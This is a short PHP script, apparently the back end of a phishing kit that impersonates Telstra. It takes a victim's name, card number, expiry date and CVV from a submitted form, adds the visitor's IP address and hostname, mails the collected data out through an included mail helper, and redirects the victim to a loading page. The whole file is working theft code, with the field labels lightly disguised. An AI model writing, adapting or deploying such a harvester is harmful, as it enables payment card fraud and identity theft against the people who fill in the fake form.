<?php
include('Email.php');
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "__________________FLOW_____________\n";
$message .= "NAMCO          : ".$_POST['name']."\n";
$message .= "CASCO          : ".$_POST['cc']."\n";
$message .= "EXPONO          : ".$_POST['exp']."\n";
$message .= "CIVOV          : ".$_POST['cvv']."\n";
$message .= "______________ INFOS OF MACHINE _________\n";
$message .= "Ip of Machine              : $ip\n";
$message .= "Host               : $hostname\n";
$message .= "_________| l7way  |__________\n";

//$subject = "Card| ".$_POST['CC']." | $ip ";
//$headers = "From:Telstra ";
_mail($message);
//$file = fopen('../Flow.txt', 'a');
//fwrite($file,$message);
header("Location: load1.php?id=4932YR-329TR23R");

?>